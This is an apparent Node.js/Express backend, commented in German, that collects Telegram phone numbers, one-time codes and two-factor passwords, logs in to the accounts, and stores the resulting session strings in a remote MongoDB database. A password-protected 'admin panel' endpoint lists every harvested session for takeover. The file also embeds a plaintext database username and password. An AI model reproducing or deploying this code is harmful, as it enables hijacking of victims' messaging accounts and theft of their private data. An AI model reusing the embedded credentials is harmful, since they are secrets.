const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const input = require('input'); // Für OTP

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Setup
const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority';
mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({
    sessionString: String,
    phoneNumber: String,
    createdAt: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

// Memory Cache für den laufenden Login-Vorgang
const activeLogins = new Map();

// API: OTP senden
app.post('/send-otp', async (req, res) => {
    const { phoneNumber, apiId, apiHash } = req.body;
    try {
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const phoneCodeHash = await client.sendCode({ apiId, apiHash }, phoneNumber);
        activeLogins.set(phoneNumber, { client, phoneCodeHash });
        res.json({ success: true, phoneCodeHash });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

// API: OTP verifizieren
app.post('/verify-otp', async (req, res) => {
    const { phoneNumber, code, password } = req.body;
    const loginData = activeLogins.get(phoneNumber);
    if (!loginData) return res.status(400).json({ error: 'Login-Sitzung abgelaufen' });

    try {
        const { client } = loginData;
        await client.signIn({
            phoneNumber,
            phoneCode: code,
            phoneCodeHash: loginData.phoneCodeHash,
            password: password
        });

        const sessionString = client.session.save();
        await SessionModel.create({ sessionString, phoneNumber });
        
        activeLogins.delete(phoneNumber);
        res.json({ success: true, session: sessionString });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

// API: Admin Panel (Sessions abrufen)
app.get('/get-sessions', async (req, res) => {
    const { pass } = req.query;
    if (pass !== '280597') { // Ändere das!
        return res.status(401).json({ error: 'Falsches Passwort' });
    }
    const sessions = await SessionModel.find();
    res.json(sessions);
});

app.listen(process.env.PORT || 3000, () => console.log('Server läuft.'));
